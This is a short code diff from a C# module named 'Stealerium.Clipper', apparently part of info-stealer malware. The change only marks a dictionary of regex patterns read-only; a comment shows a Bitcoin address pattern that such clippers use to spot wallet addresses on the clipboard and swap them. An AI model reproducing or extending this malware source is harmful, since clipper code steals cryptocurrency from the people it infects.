@@ -7,7 +7,7 @@ namespace Stealerium.Clipper
     internal sealed class RegexPatterns
     {
         // Encrypted regex
-        public static Dictionary<string, Regex> PatternsList = new Dictionary<string, Regex>
+        public static readonly Dictionary<string, Regex> PatternsList = new Dictionary<string, Regex>
         {
             // Bitcoin ^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$
             {
